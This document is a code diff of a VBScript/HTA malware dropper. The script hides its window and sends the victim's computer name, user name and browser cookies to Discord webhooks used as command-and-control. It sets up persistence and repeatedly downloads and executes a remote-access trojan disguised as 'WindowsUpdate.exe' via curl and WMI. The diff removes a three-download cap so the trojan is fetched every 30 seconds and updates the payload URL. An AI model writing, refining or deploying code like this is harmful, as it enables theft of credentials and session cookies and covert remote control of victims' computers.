@@ -6,7 +6,7 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, PC, USER, ratCount
+Dim sh, fso, WH, RE_WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -15,7 +15,6 @@ RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
-ratCount = 0
 
 ' --- 1. INITIAL GRABS (to C2 WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
@@ -25,7 +24,6 @@ Call Persistence
 Call PostCookieOnly(WH)
 
 ' --- 2. DROP RAT LAST (init) ---
-ratCount = ratCount + 1
 Call DropRAT(WH, True)
 
 ' --- 3. LOOP (30s, grabs + RAT re-drop to RE_WH) ---
@@ -38,11 +36,8 @@ Do
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     
-    ' Only download RAT if under 3 drops total
-    If ratCount < 3 Then
-        ratCount = ratCount + 1
-        Call DropRAT(RE_WH, True)
-    End If
+    ' Download RAT EVERY re-grab
+    Call DropRAT(RE_WH, True)
     
     Call SleepSeconds(30)
 Loop
@@ -51,7 +46,8 @@ window.close()
 
 ' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572780865300201522/WindowsUpdate.exe?ex=6aff9dd3&is=6afe4c53&hm=69e17f8d49f71c492d9a30651f54d75e4c63c43dea23110cef0e5435923ceee4&"
+    ' Updated RAT Link
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1573211629770772510/Winupdate.exe?ex=6b012f01&is=6affdd81&hm=a224ef4e41dca378740f95f58a8a0cdd5406aa60f24b376a510f101adcf83d9b&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
@@ -61,9 +57,11 @@ Sub DropRAT(targetWH, sendRocket)
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
+    ' Download via curl.exe
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
     sh.Run dlCmd, 0, True
 
+    ' Check file and execute
     If fso.FileExists(op) Then
         Dim fSize : fSize = fso.GetFile(op).Size
         If fSize > 100000 Then
@@ -71,6 +69,7 @@ Sub DropRAT(targetWH, sendRocket)
             
             If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading: " & fSizeMB & " MB", 10181046, targetWH)
             
+            ' Execute via WMI
             Call RunCmd("""" & op & """")
             
             If sendRocket Then 
